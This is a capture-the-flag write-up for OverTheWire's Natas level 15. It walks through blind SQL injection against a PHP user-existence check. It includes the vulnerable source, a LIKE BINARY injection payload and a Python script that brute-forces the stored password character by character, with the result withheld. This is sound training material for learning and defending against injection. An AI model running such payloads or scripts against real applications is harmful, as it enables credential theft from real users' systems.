# Natas15
#natas #burp-suite #python #blind-sql-injection
## Vulnerability:

> [!NOTE]
>**Blind SQL Injection** is a type of SQL injection where you **cannot see the database results directly**, so you extract information by asking the database **questions** and observing the application's response.
## Technique:
Manipulated Blind SQL injection through a python script to retrieve the password for the next level;
#### Steps:
###### 1) Analyzing the web application
**Screenshot:**

<img width="1502" height="443" alt="image" src="https://github.com/user-attachments/assets/1ba8eeab-649d-40f2-a9dd-bcc7aafbae7e" />

**Source code:**
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if (array_key_exists("username", $_REQUEST)) {

    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * FROM users WHERE username=\"" . $_REQUEST["username"] . "\"";

    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);

    if ($res) {

        if (mysqli_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }

    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);

}

?>
```
The web application checks whether a user is in the database by counting the number of rows returned by the query:
```SQL
SELECT * from users where username=\"".$_REQUEST["username"]."\"
```
If the query returns **one or more rows**, the user exists; otherwise, the user does not exist.
The user input is directly concatenated to the SQL query, which makes it vulnerable to SQL injection. Since the web application only prints `This user exists` and `This user doesn't exist`, we can use this behavior to extract information from the database. 
###### 2) Investigating the database
Firstly, we tested common usernames to determine which accounts existed in the database.
```
admin
administrator
root
natas16
natas
```
We concluded the presence of natas16 username. As the database also stores passwords, the password for the next level is likely associated with the username `natas16`.
###### 3) Method to find the password
We can try a payload like:
```
natas16" AND password LIKE BINARY "a%" #
```
This modifies the SQL query logic:
```SQL
SELECT * from users where username="natas16" AND password LIKE BINARY "a%" # "
```
The query returns a row only if the user is `natas16` and the password starts with `a`. In that case, the application displays `This user exists`.
We can use this method to retrieve the password. Each time we find the correct character, we start guessing the next one, until we find the full 32 characters key. 

> [!NOTE]
> BINARY
> `BINARY` makes the comparison **case-sensitive**. Without it, MySQL may treat uppercase and lowercase letters as equal (for example, `A` and `a`). Using `BINARY` ensures that each character is matched exactly, allowing the password to be extracted accurately.
###### 4) Using python script to automate the task
Firstly, we'll analyze the request made by the web application using burp suite:
```http
POST /index.php HTTP/1.1
Host: natas15.natas.labs.overthewire.org
Content-Length: 52
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas15.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas15.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br

username=natas16
```
We can automate the same POST request while modifying the SQL injection payload passed through the `username` parameter until the complete password is recovered.
**Script:**
```python
import requests  
import string  
  
url = "http://natas15.natas.labs.overthewire.org/index.php"  
  
auth = ("natas15", "<NATAS14_PASSWORD>")  

# "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"  
chars = string.ascii_letters + string.digits  
  
password = ""  
  
for position in range(32):  
    for c in chars:  
        
        d = {  
            "username": f'natas16" AND password LIKE BINARY "{password}{c}%" #'  
        }  
  
        r = requests.post(url, data=d, auth=auth)  
  
        if "This user exists" in r.text:  
            password += c  
            if position % 10 == 0 or position == 31:  
                   print(f"[{position}] Password: {password}")  
            break
```
The script prints progress every 10 characters, showing the password being built character by character until all 32 are found.

> [!NOTE]
> d = {"username": f'natas16" AND password LIKE BINARY "{password}{c}%" #'}
> The `requests` library automatically converts the dictionary into the POST body:
> ```
> username=natas16%22+AND+password+LIKE+BINARY+%22...
> ```
> which reproduces the same request sent by the web application.
>```
> username=natas16%22+AND+password+LIKE+BINARY+%22...
>```
which reproduces the same request sent by the web application.

**Script output:**
```
[0] Password: X
[10] Password: X----------
[20] Password: X--------------------
[30] Password: X------------------------------
[31] Password: X------------------------------b
```
###### 5) Verifying the password
We can use the following payload to check if we found the correct password:
```
natas16" AND password = "<PASSWORD_FOUND>" #
```
**Result:**

<img width="1485" height="346" alt="image" src="https://github.com/user-attachments/assets/a0078bdb-3ebe-4fef-b53e-9b91f58992e8" />

We successfully extracted the correct password using **Blind SQL injection**.
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas14](./Natas14.md)
## Next Level:
[Natas16](./Natas16.md)
